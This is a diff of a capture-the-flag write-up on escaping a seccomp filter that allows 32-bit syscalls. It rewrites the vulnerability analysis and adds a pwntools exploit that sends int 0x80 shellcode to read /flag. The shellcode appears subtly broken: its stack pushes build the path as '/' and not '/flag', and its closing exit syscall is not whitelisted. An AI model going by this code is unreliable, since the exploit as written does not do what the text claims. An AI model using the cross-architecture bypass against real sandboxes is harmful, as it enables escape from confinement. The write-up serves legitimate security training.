@@ -75,24 +75,75 @@ int main(int argc, char **argv, char **envp)
 }
 ```
 
-= Cross-Arch Syscall Confusion
+== Vulnerability Analysis
 
-Level 9 uses a Seccomp filter that whitelists only four syscalls: `close`, `stat`, `fstat`, and `lstat`. Crucially, it also enables support for the 32-bit architecture (`SCMP_ARCH_X86`).
+The challenge implements a seccomp filter that whitelists specific system calls (`close`, `stat`, `fstat`, `lstat`) and explicitly enables support for the 32-bit x86 architecture (`SCMP_ARCH_X86`).
 
-Seccomp filters work by checking the syscall number. However, syscall numbers are different between 64-bit and 32-bit architectures.
+The vulnerability arises because seccomp filters often check the system call *number*, but system call numbers differ between architectures.
 
-*Syscall Mapping:*
-- 64-bit: 3 = `close`, 4 = `stat`
-- 32-bit: 3 = `read`, 4 = `write`
+*   **x86-64 (64-bit):**
+    *   `close`: 3
+    *   `stat`: 4
+    *   `fstat`: 5
+    *   `lstat`: 6
+*   **x86 (32-bit):**
+    *   `read`: 3
+    *   `write`: 4
+    *   `open`: 5
 
-Because the filter whitelists syscall numbers 3 and 4 (thinking they are `close` and `stat` in 64-bit), we can use the 32-bit syscall entry point (`int 0x80`) to call `read` and `write` instead.
+The filter allows syscalls 3, 4, 5, and 6. If we switch the processor to 32-bit mode (or simply execute the 32-bit `int 0x80` instruction), the kernel interprets these numbers as `read`, `write`, and `open`.
 
-*Exploit Strategy:*
-1. Call 32-bit `open` (5)? Wait, 5 is whitelisted?
-  - 64-bit 5 is `fstat`.
-  - 32-bit 5 is `open`.
-2. So we can use 32-bit syscall 5 to open the flag.
-3. Use 32-bit syscall 3 to read the flag.
-4. Use 32-bit syscall 4 to write the flag to stdout.
+== Exploitation Plan
 
-This is a powerful bypass that occurs when a sandbox allows multiple architectures but doesn't properly validate syscall numbers against the architecture used during the call.
+1.  **Switch Mode (Conceptually):** We don't need to fully switch the process to 32-bit mode; we just need to use the 32-bit system call interface (`int 0x80`).
+2.  **Open Flag:** Call syscall 5 (`open`) to open `/flag`.
+3.  **Read Flag:** Call syscall 3 (`read`) to read from the FD returned by open.
+4.  **Write Flag:** Call syscall 4 (`write`) to write the flag to stdout.
+
+== Exploit Script
+
+```python
+from pwn import *
+
+exe = "./challenge"
+context.binary = exe
+
+p = process(exe)
+
+# We use 32-bit shellcode (x86) to trigger the confused syscalls.
+# Even though the process is 64-bit, we can execute 32-bit syscalls using int 0x80.
+shellcode = asm("""
+    .code32
+    
+    /* open("/flag", 0) -> syscall 5 */
+    push 0                  /* null terminator */
+    push 0x67616c66         /* "flag" */
+    push 0x2f               /* "/" */
+    mov ebx, esp            /* filename pointer */
+    xor ecx, ecx            /* flags: O_RDONLY */
+    mov eax, 5              /* syscall: open (32-bit) */
+    int 0x80
+
+    /* read(fd, buf, 100) -> syscall 3 */
+    mov ebx, eax            /* fd from open */
+    mov ecx, esp            /* buffer (reuse stack) */
+    mov edx, 100            /* count */
+    mov eax, 3              /* syscall: read (32-bit) */
+    int 0x80
+
+    /* write(1, buf, 100) -> syscall 4 */
+    mov ebx, 1              /* fd: stdout */
+    mov ecx, esp            /* buffer */
+    mov edx, eax            /* count (bytes read) */
+    mov eax, 4              /* syscall: write (32-bit) */
+    int 0x80
+
+    /* exit(0) */
+    mov eax, 1
+    xor ebx, ebx
+    int 0x80
+""", arch="i386")
+
+p.send(shellcode)
+p.interactive()
+```
